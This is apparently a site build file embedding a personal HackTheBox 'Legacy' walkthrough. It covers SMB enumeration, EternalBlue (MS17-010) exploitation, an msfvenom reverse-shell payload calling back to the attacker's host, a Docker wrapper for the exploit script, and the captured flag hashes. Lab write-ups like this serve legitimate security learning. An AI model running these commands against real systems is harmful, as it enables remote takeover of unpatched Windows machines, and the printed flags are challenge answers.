"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[7808],{28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>r});var s=t(96540);const o={},i=s.createContext(o);function a(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),s.createElement(i.Provider,{value:n},e.children)}},71761:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"hacker/hackthebox/legacy","title":"HackTheBox Legacy Walkthrough - Windows SMB Exploitation and MS08-067","description":"Complete walkthrough of HackTheBox Legacy machine. Learn Windows SMB exploitation, MS08-067 vulnerability, and classic Windows penetration testing.","source":"@site/docs/hacker/hackthebox/legacy.md","sourceDirName":"hacker/hackthebox","slug":"/hacker/hackthebox/legacy","permalink":"/docs/hacker/hackthebox/legacy","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/hackthebox/legacy.md","tags":[{"inline":true,"label":"hackthebox","permalink":"/docs/tags/hackthebox"},{"inline":true,"label":"windows","permalink":"/docs/tags/windows"},{"inline":true,"label":"smb","permalink":"/docs/tags/smb"},{"inline":true,"label":"ms08-067","permalink":"/docs/tags/ms-08-067"},{"inline":true,"label":"vulnerability","permalink":"/docs/tags/vulnerability"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1758526302000,"sidebarPosition":2,"frontMatter":{"title":"HackTheBox Legacy Walkthrough - Windows SMB Exploitation and MS08-067","description":"Complete walkthrough of HackTheBox Legacy machine. Learn Windows SMB exploitation, MS08-067 vulnerability, and classic Windows penetration testing.","keywords":["hackthebox legacy","windows exploitation","smb exploitation","ms08-067","windows vulnerabilities","penetration testing"],"tags":["hackthebox","windows","smb","ms08-067","vulnerability"],"sidebar_position":2},"sidebar":"docsSidebar","previous":{"title":"HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide","permalink":"/docs/hacker/hackthebox/traverxec"},"next":{"title":"HackTheBox Shocker Walkthrough - Shellshock Vulnerability Exploitation","permalink":"/docs/hacker/hackthebox/shocker"}}');var o=t(74848),i=t(28453);const a={title:"HackTheBox Legacy Walkthrough - Windows SMB Exploitation and MS08-067",description:"Complete walkthrough of HackTheBox Legacy machine. Learn Windows SMB exploitation, MS08-067 vulnerability, and classic Windows penetration testing.",keywords:["hackthebox legacy","windows exploitation","smb exploitation","ms08-067","windows vulnerabilities","penetration testing"],tags:["hackthebox","windows","smb","ms08-067","vulnerability"],sidebar_position:2},r=void 0,l={},c=[{value:"KEY LEARNINGS",id:"key-learnings",level:2},{value:"RECON",id:"recon",level:2},{value:"Scan",id:"scan",level:3},{value:"Enumerate",id:"enumerate",level:3},{value:"EXPLOIT",id:"exploit",level:2},{value:"searchsploit",id:"searchsploit",level:3},{value:"AutoBlue Script",id:"autoblue-script",level:3},{value:"manual exploitation",id:"manual-exploitation",level:3},{value:"custom solution",id:"custom-solution",level:3},{value:"FLAGS",id:"flags",level:2},{value:"user.txt",id:"usertxt",level:3},{value:"root.txt",id:"roottxt",level:3},{value:"Troubleshooting, Errors, Notes",id:"troubleshooting-errors-notes",level:2},{value:"python2 impacket issues",id:"python2-impacket-issues",level:3},{value:"move to python3",id:"move-to-python3",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,i.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsxs)(n.admonition,{title:"Description",type:"info",children:[(0,o.jsxs)(n.p,{children:["These are my notes for the Legacy (Retired) Box on ",(0,o.jsx)(n.a,{href:"https://hackthebox.com",children:"HackTheBox"}),"."]}),(0,o.jsx)(n.p,{children:"Credits: S/o to Sno0wCS for the collab session on this box."}),(0,o.jsxs)(n.table,{children:[(0,o.jsx)(n.thead,{children:(0,o.jsxs)(n.tr,{children:[(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"OS"}),(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"Level"}),(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,o.jsx)(n.tbody,{children:(0,o.jsxs)(n.tr,{children:[(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"Windows"}),(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"Easy"}),(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"4/5"})]})})]})]}),"\n",(0,o.jsx)(n.h2,{id:"key-learnings",children:"KEY LEARNINGS"}),"\n",(0,o.jsx)(n.admonition,{type:"tip",children:(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"I need a more clear Samba enumeration playbook at the ready"}),"\n",(0,o.jsx)(n.li,{children:"I need a better exploit lab environment to better download, edit and run exploits that may not be supported by modern environments."}),"\n"]})}),"\n",(0,o.jsx)(n.h2,{id:"recon",children:"RECON"}),"\n",(0,o.jsx)(n.h3,{id:"scan",children:"Scan"}),"\n",(0,o.jsx)(n.p,{children:"first run of nmap:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.92 scan initiated Mon Mar 14 09:16:06 2022 as: nmap -v -Pn -p- -o nmap-legacy.txt 10.10.10.4\nNmap scan report for 10.10.10.4\nHost is up (0.23s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nPORT     STATE  SERVICE\n139/tcp  open   netbios-ssn\n445/tcp  open   microsoft-ds\n3389/tcp closed ms-wbt-server\n\nRead data files from: /usr/bin/../share/nmap\n# Nmap done at Mon Mar 14 09:27:25 2022 -- 1 IP address (1 host up) scanned in 679.20 seconds\n"})}),"\n",(0,o.jsx)(n.p,{children:"We can see the classic 139,445 port combo that tells us SMB is in the house, so we scan them."}),"\n",(0,o.jsx)(n.h3,{id:"enumerate",children:"Enumerate"}),"\n",(0,o.jsxs)(n.p,{children:["First ",(0,o.jsx)(n.code,{children:"--script smb-enum-shares"}),":"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ nmap --script smb-enum-shares -p 139,445 10.10.10.4 -Pn\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 09:37 NZDT\nNmap scan report for 10.10.10.4\nHost is up (0.25s latency).\n\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-enum-shares:\n|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)\n|   account_used: <blank />\n|   \\\\10.10.10.4\\ADMIN$:\n|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED\n|     Anonymous access: <none />\n|   \\\\10.10.10.4\\C$:\n|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED\n|     Anonymous access: <none />\n|   \\\\10.10.10.4\\IPC$:\n|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED\n|_    Anonymous access: READ\n\nNmap done: 1 IP address (1 host up) scanned in 375.21 seconds\n"})}),"\n",(0,o.jsxs)(n.p,{children:["then, ",(0,o.jsx)(n.code,{children:"--script smb-vuln*"}),":"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ nmap --script smb-vuln* -p 139,445 10.10.10.4 -Pn\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 09:38 NZDT\nNmap scan report for 10.10.10.4\nHost is up (0.70s latency).\n\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|\n|     Disclosure date: 2017-03-14\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)\n|_smb-vuln-ms10-054: false\n"})}),"\n",(0,o.jsx)(n.p,{children:"We got a hit! Looks like the ol' EternalBlue exploit!"}),"\n",(0,o.jsx)(n.h2,{id:"exploit",children:"EXPLOIT"}),"\n",(0,o.jsx)(n.h3,{id:"searchsploit",children:"searchsploit"}),"\n",(0,o.jsxs)(n.p,{children:["Run ",(0,o.jsx)(n.code,{children:"searchsploit"})," to find an exploit to use:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"searchsploit eternalblue\n---------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                    |  Path\n---------------------------------------------------------------------------------- ---------------------------------\nMicrosoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)  | windows/remote/42031.py\nMicrosoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code E | windows/remote/42315.py\nMicrosoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution ( | windows_x86-64/remote/42030.py\n---------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n"})}),"\n",(0,o.jsxs)(n.p,{children:["I downloaded both ",(0,o.jsx)(n.code,{children:"42031.py"})," and ",(0,o.jsx)(n.code,{children:"42315.py"})," exploits and tried to get them working, but kept running into issues with python2 vs python3 dependencies."]}),"\n",(0,o.jsx)(n.p,{children:"So off to the internet I go to find some existing exploit setups."}),"\n",(0,o.jsx)(n.h3,{id:"autoblue-script",children:"AutoBlue Script"}),"\n",(0,o.jsxs)(n.p,{children:["I did a quick search online and found ",(0,o.jsx)(n.a,{href:"https://github.com/3ndG4me/AutoBlue-MS17-010",children:"AutoBlue-MS17-010"}),":"]}),"\n",(0,o.jsx)(n.admonition,{title:"requirements",type:"info",children:(0,o.jsx)(n.p,{children:"Check the repo for requirements for the scripts."})}),"\n",(0,o.jsx)(n.p,{children:"I tried the the following scripts first, but all said the host didn't support that exploit:"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"eternalblue_exploit7.py"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"eternalblue_exploit8.py"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"eternalblue_exploit10.py"})}),"\n"]}),"\n",(0,o.jsxs)(n.p,{children:["Only ",(0,o.jsx)(n.code,{children:"zzz_exploit.py"})," that worked for me on this box:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ python3 zzz_exploit.py 10.10.10.4                                                                           2 \u2a2f\n[*] Target OS: Windows 5.1\n[+] Found pipe 'browser'\n[+] Using named pipe: browser\nGroom packets\nattempt controlling next transaction on x86\nsuccess controlling one transaction\nmodify parameter count to 0xffffffff to be able to write backward\nleak next transaction\nCONNECTION: 0x822d7da8\nSESSION: 0xe22f3c18\nFLINK: 0x7bd48\nInData: 0x7ae28\nMID: 0xa\nTRANS1: 0x78b50\nTRANS2: 0x7ac90\nmodify transaction struct for arbitrary read/write\n[*] make this SMB session to be SYSTEM\n[+] current TOKEN addr: 0xe1b761c0\nuserAndGroupCount: 0x3\nuserAndGroupsAddr: 0xe1b76260\n[*] overwriting token UserAndGroups\n[*] have fun with the system smb session!\n[!] Dropping a semi-interactive shell (remember to escape special chars with ^)\n[!] Executing interactive programs will hang shell!\nC:\\WINDOWS\\system32>\n"})}),"\n",(0,o.jsx)(n.p,{children:"Awesome, we have a shell!"}),"\n",(0,o.jsx)(n.p,{children:"What can we do? Let's find the user flag:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"C:\\WINDOWS\\system32>net user\n\nUser accounts for \\\\\n\n-------------------------------------------------------------------------------\nAdministrator            Guest                    HelpAssistant\njohn                     SUPPORT_388945a0\nThe command completed with one or more errors.\n\n\nC:\\WINDOWS\\system32>cd C:\\Users\\john\nERROR:root:You cant CD under SMBEXEC. Use full paths.\nC:\\WINDOWS\\system32>\n\nC:\\WINDOWS\\system32>net use\nNew connections will be remembered.\n\nThere are no entries in the list.\n\n\nC:\\WINDOWS\\system32>net session\n\nComputer               User name            Client Type       Opens Idle time\n\n-------------------------------------------------------------------------------\n\\\\10.10.16.4                                posix                 2 00:00:00\n\\\\127.0.0.1                                 Windows 2002 Serv     2 00:00:00\nThe command completed successfully.\n"})}),"\n",(0,o.jsx)(n.p,{children:"After trying a few things, I managed to add an Administrator user but that didn't really work out to anything, so I thought I'd try and get a better shell."}),"\n",(0,o.jsx)(n.h3,{id:"manual-exploitation",children:"manual exploitation"}),"\n",(0,o.jsxs)(n.p,{children:["After several hours of python dependency hell, I looked up how people were exploiting an XP machine, manually, with these python2 scripts that are everywhere and came across this blog post: ",(0,o.jsx)(n.a,{href:"https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/",children:'"Exploiting MS17-010 without Metasploit (Win XP SP3)"'})]}),"\n",(0,o.jsxs)(n.p,{children:["And this was the first time seeing someone use the ",(0,o.jsx)(n.code,{children:"send_and_execute.py"})," script, so I thought I'd give it a go."]}),"\n",(0,o.jsx)(n.admonition,{title:"send and execute",type:"tip",children:(0,o.jsxs)(n.p,{children:["The basic idea with ",(0,o.jsx)(n.code,{children:"send_and_execute.py"})," is using EternalBlue exploit to send a file to our target (e.g. a reverse shell executable), and then run it on the target e.g. if it's a reverse shell executable, it will call back to the LHOST we generated the shellcode with."]})}),"\n",(0,o.jsx)(n.p,{children:"I copied the following scripts to their own folder (clean workspace):"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"send_and_execute.py"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"mysmb.py"})}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.code,{children:"zzz_exploit.py"})," - in case this method bombs out as well lol."]}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"I generate my reverse shell *.exe with:"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe"})}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of exe file: 73802 bytes\nSaved as: ms17-010.exe\n"})}),"\n",(0,o.jsx)(n.p,{children:"Let's run it and see what happens:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(rxhackk\u327fkali)-[~/\u2026/HTB/BOXES/LEGACY/working]-[tun0: 10.10.16.2]\n\u2514\u2500$ ./send_and_execute.py 10.10.10.4 ms17-010.exe\nTrying to connect to 10.10.10.4:445\nTarget OS: Windows 5.1\nUsing named pipe: browser\nGroom packets\nattempt controlling next transaction on x86\nTraceback (most recent call last):\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 1077, in <module />\n    exploit(target, port, pipe_name)\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 839, in exploit\n    if not info[\'method\'](conn, pipe_name, info):\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 641, in exploit_fish_barrel\n    conn.send_trans_secondary(mid=info[\'fid\'], data=\'\\x00\', dataDisplacement=NEXT_TRANS_OFFSET+tinfo[\'TRANS_MID_OFFSET\'])\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/mysmb.py", line 309, in send_trans_secondary\n    self.send_raw(self.create_trans_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/mysmb.py", line 305, in create_trans_secondary_packet\n    _put_trans_data(transCmd, param, data, noPad)\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/mysmb.py", line 83, in _put_trans_data\n    transData += (b\'\\x00\' * padLen) + data\nTypeError: can\'t concat str to bytes\n'})}),"\n",(0,o.jsxs)(n.p,{children:["Crap- I'm running the script as ",(0,o.jsx)(n.code,{children:"#!/usr/bin/env python3"})," and the script itself was written for python2, so we're still in this python dependency hell. Annoying."]}),"\n",(0,o.jsx)(n.p,{children:"No matter, DevOps Engineering skills to the rescue:"}),"\n",(0,o.jsx)(n.h3,{id:"custom-solution",children:"custom solution"}),"\n",(0,o.jsx)(n.p,{children:"The idea here is to pack everything into a python2 image base, install all the python2 dependencies, and run the python2 scripts from inside a fully dependant container."}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-docker",children:'FROM python:2.7\n\n# update pip\nRUN pip install --upgrade pip\n\n# install dependencies for the env\nRUN pip install ldap3==2.5.1 \\\n    future \\\n    dnspython \\\n    cryptography==2.3 \\\n    MarkupSafe==0.23\n\n# set the working directory\nWORKDIR /app\n\n# copy our files from host to container\nCOPY ms17-010.exe send_and_execute.py mysmb.py /app/\n\n# download & install impacket\nRUN git clone https://github.com/SecureAuthCorp/impacket.git\nRUN cd impacket && python2 -m pip install .\n\n# set our command to run when the container is run\nCMD ["/usr/local/bin/python", "./send_and_execute.py", "10.10.10.4", "./ms17-010.exe"]\n'})}),"\n",(0,o.jsxs)(n.p,{children:["Build our container: ",(0,o.jsx)(n.code,{children:"docker build -t bluexp ."})]}),"\n",(0,o.jsxs)(n.p,{children:["Set up the listener ready for the callback: ",(0,o.jsx)(n.code,{children:"sudo rlwrap nc -lnvp 443"})]}),"\n",(0,o.jsx)(n.p,{children:"Now run it:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u2500\u2500(rxhackk\u327fkali)-[~/\u2026/HTB/BOXES/LEGACY/workingv2]-[tun0: 10.10.16.2]\n\u2514\u2500$ docker run -it bluexp\nTrying to connect to 10.10.10.4:445\nTarget OS: Windows 5.1\nUsing named pipe: browser\nGroom packets\nattempt controlling next transaction on x86\nsuccess controlling one transaction\nmodify parameter count to 0xffffffff to be able to write backward\nleak next transaction\nCONNECTION: 0x81f19cb0\nSESSION: 0xe11b7bd8\nFLINK: 0x7bd48\nInData: 0x7ae28\nMID: 0xa\nTRANS1: 0x78b50\nTRANS2: 0x7ac90\nmodify transaction struct for arbitrary read/write\nmake this SMB session to be SYSTEM\ncurrent TOKEN addr: 0xe17d91b0\nuserAndGroupCount: 0x3\nuserAndGroupsAddr: 0xe17d9250\noverwriting token UserAndGroups\nSending file C1HC8I.exe...\nOpening SVCManager on 10.10.10.4.....\nCreating service CmRK.....\nStarting service CmRK.....\nThe NETBIOS connection with the remote host timed out.\nRemoving service CmRK.....\nServiceExec Error on: 10.10.10.4\nnca_s_proto_error\nDone\n"})}),"\n",(0,o.jsx)(n.p,{children:"And while we are watching the listener in another terminal..."}),"\n",(0,o.jsx)(n.p,{children:"Success!"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(rxhackk\u327fkali)-[~]-[tun0: 10.10.16.2]\n\u2514\u2500$ sudo rlwrap nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.10.16.2] from (UNKNOWN) [10.10.10.4] 1032\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>\n"})}),"\n",(0,o.jsx)(n.h2,{id:"flags",children:"FLAGS"}),"\n",(0,o.jsx)(n.h3,{id:"usertxt",children:"user.txt"}),"\n",(0,o.jsx)(n.p,{children:"Let's find the user flag:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:" Volume Serial Number is 54BF-723B\n\n Directory of C:\\Documents and Settings\\john\n\n16/03/2017  08:33 \ufffd\ufffd    <DIR />          .\n16/03/2017  08:33 \ufffd\ufffd    <DIR />          ..\n16/03/2017  09:19 \ufffd\ufffd    <DIR />          Desktop\n16/03/2017  08:33 \ufffd\ufffd    <DIR />          Favorites\n16/03/2017  08:33 \ufffd\ufffd    <DIR />          My Documents\n16/03/2017  08:20 \ufffd\ufffd    <DIR />          Start Menu\n               0 File(s)              0 bytes\n               6 Dir(s)   6.313.111.552 bytes free\n\ndir john\\Desktop\ndir john\\Desktop\n Volume in drive C has no label.\n Volume Serial Number is 54BF-723B\n\n Directory of C:\\Documents and Settings\\john\\Desktop\n\n16/03/2017  09:19 \ufffd\ufffd    <DIR />          .\n16/03/2017  09:19 \ufffd\ufffd    <DIR />          ..\n16/03/2017  09:19 \ufffd\ufffd                32 user.txt\n               1 File(s)             32 bytes\n               2 Dir(s)   6.313.111.552 bytes free\n\ntype john\\Desktop\\user.txt\ntype john\\Desktop\\user.txt\ne69af0e4f443de7e36876fda4ec7644f\nC:\\Documents and Settings>\n"})}),"\n",(0,o.jsx)(n.h3,{id:"roottxt",children:"root.txt"}),"\n",(0,o.jsxs)(n.p,{children:["Thought I would need ",(0,o.jsx)(n.code,{children:"winpeas.exe"})," to scan the box for possible privesc."]}),"\n",(0,o.jsxs)(n.p,{children:["Thanks to my work mate Duane aka ",(0,o.jsx)(n.code,{children:"th3rock_"})," who dropped by the stream and showed me this cool technique."]}),"\n",(0,o.jsxs)(n.p,{children:["Run your own ",(0,o.jsx)(n.code,{children:"smbserver"})," instead of a webserver, which you can then use like a remote NFS share to download tools from, and output logs to so your attack files never touch the target machines disk."]}),"\n",(0,o.jsxs)(n.p,{children:["On my attack machine (kali), inside the dir I want to serve, run ",(0,o.jsx)(n.code,{children:"impacket-smbserver"}),":"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(rxhackk\u327fkali)-[~/\u2026/winPEAS/winPEASexe/binaries/Release]-[tun0: 10.10.16.2]\n\u2514\u2500$ impacket-smbserver  tools .\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.10.4,1038)\n[*] AUTHENTICATE_MESSAGE (\\,LEGACY)\n[*] User LEGACY\\ authenticated successfully\n[*] :::00::aaaaaaaaaaaaaaaa\n[-] TreeConnectAndX not found WINPEASANY.EXE\n[*] Closing down connection (10.10.10.4,1038)\n[*] Remaining connections []\n[*] Incoming connection (10.10.10.4,1041)\n[*] AUTHENTICATE_MESSAGE (\\,LEGACY)\n[*] User LEGACY\\ authenticated successfully\n[*] :::00::aaaaaaaaaaaaaaaa\n[-] Unknown level for query path info! 0x109\n"})}),"\n",(0,o.jsxs)(n.p,{children:["Over on my reverse shell setup by my ",(0,o.jsx)(n.code,{children:"bluexp"})," eternalblue docker container, I can do this to copy ",(0,o.jsx)(n.code,{children:"winpeasany.exe"})," to the Windows machine:"]}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"copy \\\\$ip\\$dir\\winpeasany.exe c:\\winpeasany.exe"})}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"Run winpeas but stdout to file back on your smbshare:"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.code,{children:"c:.\\winpeasany.exe > \\\\$ip\\$dir\\winpeas.log"})}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"I tried a few other things to get winpeas working, before I realized..."}),"\n",(0,o.jsx)(n.p,{children:"I didn't even need to privesc cos I could get to the Administrator files already:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:" Volume in drive C has no label.\n Volume Serial Number is 54BF-723B\n\n Directory of C:\\Documents and Settings\\Administrator\\Desktop\n\n16/03/2017  09:18     <DIR />          .\n16/03/2017  09:18     <DIR />          ..\n16/03/2017  09:18                 32 root.txt\n               1 File(s)             32 bytes\n               2 Dir(s)   6.398.578.688 bytes free\n\ntype root.txt\ntype root.txt\n993442d258b0e0ec917cae9e695d5713\nC:\\Documents and Settings\\Administrator\\Desktop>\n"})}),"\n",(0,o.jsx)(n.p,{children:"Important lesson here to always check assumptions- I assumed I wouldn't have admin/root yet, but never confirmed that was the case."}),"\n",(0,o.jsx)(n.p,{children:"Success and my very first HTB box completed."}),"\n",(0,o.jsx)(n.h2,{id:"troubleshooting-errors-notes",children:"Troubleshooting, Errors, Notes"}),"\n",(0,o.jsx)(n.h3,{id:"python2-impacket-issues",children:"python2 impacket issues"}),"\n",(0,o.jsx)(n.p,{children:"the dilemma:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-sh",children:'\u2514\u2500$ python3 zzz_exploit.py 10.10.10.4\nTarget OS: Windows 5.1\nUsing named pipe: browser\nGroom packets\nTraceback (most recent call last):\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 1064, in <module />\n    exploit(target, port, pipe_name)\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 835, in exploit\n    if not info[\'method\'](conn, pipe_name, info):\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 612, in exploit_fish_bar\nrel\n    conn.send_trans(\'\', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0,\nmaxParameterCount=0x40, maxDataCount=0)\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 262, in send_trans\n    self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCou\nnt, maxParameterCount, maxDataCount, pid, tid, noPad))\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 258, in create_trans_packet\n    _put_trans_data(transCmd, param, data, noPad)\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 73, in _put_trans_data\n    transData = (\'\\x00\' * padLen) + parameters\nTypeError: can only concatenate str (not "bytes") to str\n'})}),"\n",(0,o.jsx)(n.p,{children:"or env doesnt' wanna know about python2"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-sh",children:'\u2514\u2500$ ./zzz_exploit.py 10.10.10.4                                                                                 1 \u2a2f\nTraceback (most recent call last):\n  File "./zzz_exploit.py", line 2, in <module />\n    from impacket import smb, smbconnection\nImportError: No module named impacket\n'})}),"\n",(0,o.jsx)(n.h3,{id:"move-to-python3",children:"move to python3"}),"\n",(0,o.jsxs)(n.p,{children:["fix ",(0,o.jsx)(n.code,{children:"./checker.py"})," with:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/env python3\n"})}),"\n",(0,o.jsx)(n.p,{children:"at the top."}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-sh",children:'\u2514\u2500$ ./checker.py 10.10.10.4                                                                                     1 \u2699\nTrying to connect to 10.10.10.4:445\nTarget OS: Windows 5.1\nTraceback (most recent call last):\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/./checker.py", line 65, in <module />\n    recvPkt = conn.send_trans(pack(\'<H\', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 262, in send_trans\n    self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 259, in create_trans_packet\n    return self.create_smb_packet(transCmd, mid, pid, tid)\n  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 229, in create_smb_packet\n    req = str(pkt)\nTypeError: __str__ returned non-string (type bytes)\n'})}),"\n",(0,o.jsx)(n.p,{children:"Clearly the answer to all dependency-hell problems, is containers. Amen."})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}}}]);